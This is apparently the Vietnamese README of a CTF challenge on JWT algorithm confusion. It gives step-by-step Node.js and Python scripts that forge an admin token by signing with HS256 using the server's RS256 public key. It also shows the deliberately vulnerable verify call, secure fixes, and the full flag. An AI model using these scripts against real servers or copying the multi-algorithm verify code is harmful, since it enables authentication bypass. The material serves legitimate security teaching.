<div align="center">

# 🔐 Thử Thách Lỗ Hổng JWT
## Algorithm Confusion Attack CTF Challenge

[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
[![Express.js](https://img.shields.io/badge/Express.js-404D59?style=for-the-badge&logo=express)](https://expressjs.com/)
[![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev/)
[![Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)](https://vercel.com)

**[Báo Lỗi](https://github.com/F12FLASH/Main-CTF/issues)** • **[Đóng Góp](https://github.com/F12FLASH/Main-CTF/pulls)**

</div>

---

## 📋 Tổng Quan

Đây là một thử thách CTF (Capture The Flag) chuyên sâu về bảo mật JWT (JSON Web Token), tập trung vào lỗ hổng **Algorithm Confusion** - một trong những lỗ hổng nguy hiểm nhất trong triển khai JWT. Thử thách này mô phỏng một tình huống thực tế nơi kẻ tấn công có thể khai thác việc server chấp nhận nhiều thuật toán JWT để giả mạo token và chiếm quyền quản trị.

### 🎯 Mục Tiêu

Khai thác lỗ hổng nhầm lẫn thuật toán giữa RS256 (bất đối xứng) và HS256 (đối xứng) để:
- Giả mạo token JWT hợp lệ
- Nâng cấp quyền từ `guest` lên `admin`
- Vượt qua cơ chế xác thực của server
- Chiếm được flag: `VNFLAG{DAN_TOC_VIET_NAM_DOAN_KET_CHIEN_DAU_VINH_QUANG_4k9Z2p7F1m6Q8r3B0sL}`

### ⚠️ Lưu Ý Bảo Mật

Ứng dụng này được thiết kế **CHỈ CHO MỤC ĐÍCH GIÁO DỤC**. Lỗ hổng được triển khai có chủ ý để minh họa các rủi ro bảo mật. **KHÔNG BAO GIỜ** áp dụng các kỹ thuật này vào hệ thống thực tế mà không có sự cho phép.

---

## 🚀 Cài Đặt và Chạy

### Yêu Cầu Hệ Thống

- Node.js 20.x hoặc cao hơn
- npm hoặc yarn
- Trình duyệt web hiện đại (Chrome, Firefox, Edge)

### Cài Đặt

```bash
# Clone repository
git clone https://github.com/F12FLASH/CTF.git
cd CTF/3.ZeroDayCookie

# Cài đặt dependencies
npm install

# Chạy ứng dụng ở chế độ development
npm run dev
```

### Truy Cập Ứng Dụng

Sau khi chạy lệnh `npm run dev`, mở trình duyệt và truy cập:
```
http://localhost:5000
```

---

## 🎓 Hướng Dẫn Chi Tiết Cho Người Thử Thách

### Bước 1: Hiểu Về JWT và Thuật Toán

**JWT (JSON Web Token)** gồm 3 phần được mã hóa Base64URL và ngăn cách bởi dấu chấm:

```
header.payload.signature
```

**RS256 (RSA Signature with SHA-256)**:
- Thuật toán bất đối xứng
- Sử dụng **khóa riêng (private key)** để ký
- Sử dụng **khóa công khai (public key)** để xác minh
- An toàn hơn vì khóa riêng được giữ bí mật

**HS256 (HMAC with SHA-256)**:
- Thuật toán đối xứng
- Sử dụng **cùng một secret** để cả ký và xác minh
- Nhanh hơn nhưng yêu cầu bảo mật secret tuyệt đối

### Bước 2: Phân Tích Token Ban Đầu

Khi bạn truy cập ứng dụng, server sẽ cấp cho bạn một token RS256. Hãy sao chép token và phân tích:

**Công cụ gợi ý**: Sử dụng https://jwt.io để giải mã

**Cấu trúc token ban đầu**:
```json
Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "rsa-key-2024"
}

Payload:
{
  "user": "guest",
  "role": "user",
  "level": 1,
  "permissions": ["read"],
  "iat": 1234567890,
  "exp": 1234571490,
  "jti": "random-unique-id"
}
```

### Bước 3: Lấy Khóa Công Khai

Server hiển thị khóa công khai RS256 trên giao diện. Hãy sao chép khóa này - đây chính là "chìa khóa" để khai thác!

### Bước 4: Khai Thác Lỗ Hổng

#### Phương Pháp 1: Sử dụng Node.js (Khuyến nghị)

Tạo file `exploit.js`:

```javascript
const jwt = require('jsonwebtoken');

// Khóa công khai RS256 từ server (sao chép từ giao diện)
const publicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzyis1ZjfNB0bBgKFMSv
vkTtwlvBsaJq7S5wA+kzeVOVpVWwkWdVha4s38XM/pa/yr47av7+z3VTmvDRyAHc
aT92whREFpLv9cj5lTeJSibyr/Mrm/YtjCZVWgaOYIhwrXwKLqPr/11inWsAkfIy
tvHWTxZYEcXLgAXFuUuaS3uF9gEiNQwzGTU1v0FqkqTBr4B8nW3HCN47XUu0t8Y0
e+lf4s4OxQawWD79J9/5d3Ry0vbV3Am1FtGJiJvOwRsIfVChDpYStTcHTCMqtvWb
V6L11BWkpzGXSW4Hv43qa+GSYOD2QU68Mb59oSk2OB+BtOLpJofmbGEGgvmwyCI9
MwIDAQAB
-----END PUBLIC KEY-----`;

// Payload đã được nâng cấp quyền
const payload = {
  user: "guest",
  role: "admin",        // ĐÃ THAY ĐỔI: từ "user" thành "admin"
  level: 99,            // ĐÃ THAY ĐỔI: từ 1 thành 99
  permissions: ["read", "write", "admin"],
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 3600,
  jti: "exploited-token"
};

// KỸ THUẬT KHAI THÁC: 
// Ký bằng HS256 sử dụng khóa công khai RS256 làm secret
// Server sẽ xác minh bằng khóa công khai, khớp với chữ ký HS256!
const exploitedToken = jwt.sign(payload, publicKey, { 
  algorithm: "HS256",
  header: {
    alg: "HS256",  // Quan trọng: phải là HS256
    typ: "JWT"
  }
});

console.log("Token đã khai thác:");
console.log(exploitedToken);
```

Chạy exploit:
```bash
node exploit.js
```

#### Phương Pháp 2: Sử dụng Python

Tạo file `exploit.py`:

```python
import jwt
import datetime

# Khóa công khai RS256 từ server
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzyis1ZjfNB0bBgKFMSv
vkTtwlvBsaJq7S5wA+kzeVOVpVWwkWdVha4s38XM/pa/yr47av7+z3VTmvDRyAHc
aT92whREFpLv9cj5lTeJSibyr/Mrm/YtjCZVWgaOYIhwrXwKLqPr/11inWsAkfIy
tvHWTxZYEcXLgAXFuUuaS3uF9gEiNQwzGTU1v0FqkqTBr4B8nW3HCN47XUu0t8Y0
e+lf4s4OxQawWD79J9/5d3Ry0vbV3Am1FtGJiJvOwRsIfVChDpYStTcHTCMqtvWb
V6L11BWkpzGXSW4Hv43qa+GSYOD2QU68Mb59oSk2OB+BtOLpJofmbGEGgvmwyCI9
MwIDAQAB
-----END PUBLIC KEY-----"""

# Payload với quyền admin
payload = {
    "user": "guest",
    "role": "admin",
    "level": 99,
    "permissions": ["read", "write", "admin"],
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
    "jti": "exploited-token"
}

# Khai thác: Ký bằng HS256 với khóa công khai
exploited_token = jwt.encode(
    payload, 
    public_key, 
    algorithm="HS256",
    headers={"alg": "HS256", "typ": "JWT"}
)

print("Token đã khai thác:")
print(exploited_token)
```

Chạy exploit:
```bash
python3 exploit.py
```

### Bước 5: Gửi Token và Chiếm Flag

1. Sao chép token đã khai thác từ kết quả exploit
2. Dán vào ô "Gửi Token Đã Khai Thác" trên giao diện web
3. Nhấn nút "Gửi Token"
4. Nếu thành công, bạn sẽ nhận được flag!

---

## 🔍 Giải Thích Chi Tiết Lỗ Hổng

### Tại Sao Lỗ Hổng Này Hoạt Động?

1. **Server thiết lập không an toàn**: Server chấp nhận cả RS256 và HS256 mà không kiểm tra chặt chẽ
2. **Cùng khóa cho xác minh**: Server sử dụng khóa công khai RS256 để xác minh token
3. **Khai thác**: Khi bạn ký token bằng HS256 với khóa công khai làm secret:
   - Header của bạn nói: "Token này được ký bằng HS256"
   - Server đọc header và xác minh bằng HS256
   - Server sử dụng khóa công khai để xác minh HS256
   - Chữ ký khớp vì bạn đã ký bằng cùng khóa đó!

### CVE-2016-5431

Đây là lỗ hổng thực tế được phát hiện năm 2016, ảnh hưởng đến nhiều thư viện JWT:
- jsonwebtoken (Node.js)
- PyJWT (Python)
- php-jwt (PHP)
- Nhiều thư viện khác

**Khắc phục**:
- Luôn chỉ định rõ ràng thuật toán được phép
- Không tin tưởng thuật toán từ token do người dùng cung cấp
- Sử dụng phiên bản thư viện đã được vá
- Áp dụng nguyên tắc "allowlist" chứ không phải "blocklist"

---

## 🛡️ Bài Học Bảo Mật

### Những Gì KHÔNG NÊN Làm (Như Server Này)

```javascript
// ❌ NGUY HIỂM: Chấp nhận nhiều thuật toán
jwt.verify(token, publicKey, {
  algorithms: ["RS256", "HS256"]  // Lỗ hổng!
});
```

### Những Gì NÊN Làm

```javascript
// ✅ AN TOÀN: Chỉ chấp nhận thuật toán cụ thể
jwt.verify(token, publicKey, {
  algorithms: ["RS256"]  // Chỉ RS256
});

// ✅ AN TOÀN HƠN: Kiểm tra thuật toán trước
const decoded = jwt.decode(token, { complete: true });
if (decoded.header.alg !== 'RS256') {
  throw new Error('Thuật toán không hợp lệ');
}
jwt.verify(token, publicKey, {
  algorithms: ["RS256"]
});
```

### Nguyên Tắc Bảo Mật JWT

1. **Luôn chỉ định thuật toán**: Không để server tự động chọn
2. **Sử dụng RS256 cho production**: Bảo mật hơn HS256
3. **Bảo vệ khóa riêng**: Không bao giờ để lộ private key
4. **Xác thực chặt chẽ**: Kiểm tra claims, expiration, signature
5. **Sử dụng HTTPS**: Bảo vệ token khi truyền tải
6. **Thời gian sống ngắn**: Token nên hết hạn nhanh
7. **Cập nhật thư viện**: Sử dụng phiên bản mới nhất đã được vá

---

## 📚 Tài Liệu Tham Khảo

### Về JWT và Bảo Mật

- [JWT.io - Official JWT Website](https://jwt.io/)
- [RFC 7519 - JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

### Về Lỗ Hổng Algorithm Confusion

- [Auth0 - Critical Vulnerabilities in JWT Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [CVE-2016-5431 Details](https://nvd.nist.gov/vuln/detail/CVE-2016-5431)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)

---

## 🎯 Mức Độ Thử Thách

**Cấp độ**: CAO THỦ ⚡

**Kỹ năng yêu cầu**:
- ✅ Hiểu biết cơ bản về JWT
- ✅ Kiến thức về mã hóa đối xứng và bất đối xứng
- ✅ Kỹ năng lập trình (Node.js/Python)
- ✅ Khả năng phân tích và debug
- ✅ Tư duy logic và sáng tạo

**Thời gian ước tính**: 30-60 phút (tùy kinh nghiệm)

---

## 🤝 Đóng Góp

Dự án này được tạo ra cho mục đích giáo dục. Nếu bạn tìm thấy lỗi hoặc có ý tưởng cải thiện:

1. Fork repository
2. Tạo branch mới (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Tạo Pull Request

---

## 📄 License

MIT License - Xem file LICENSE để biết chi tiết

---

## ⚠️ Disclaimer

Ứng dụng này được thiết kế **CHỈ CHO MỤC ĐÍCH GIÁO DỤC** để giúp học viên hiểu về lỗ hổng bảo mật JWT. 

**KHÔNG BAO GIỜ**:
- Sử dụng kỹ thuật này trên hệ thống thực tế mà không có sự cho phép
- Triển khai code này vào production mà không fix các lỗ hổng
- Tấn công vào hệ thống của người khác

Tác giả không chịu trách nhiệm về việc sử dụng sai mục đích thông tin trong dự án này.

---

## 📞 Liên Hệ & Hỗ Trợ

Nếu bạn gặp khó khăn hoặc có câu hỏi về thử thách:

- Đọc kỹ phần "Gợi Ý Từng Bước" trong ứng dụng
- Tham khảo các tài liệu trong phần "Tài Liệu Tham Khảo"
- Kiểm tra code mẫu trong phần "Hướng Dẫn Chi Tiết"

**Chúc bạn thành công trong việc chiếm flag!** 🚩

---

Made with ❤️ for F12FLASH | Việt Nam 🇻🇳
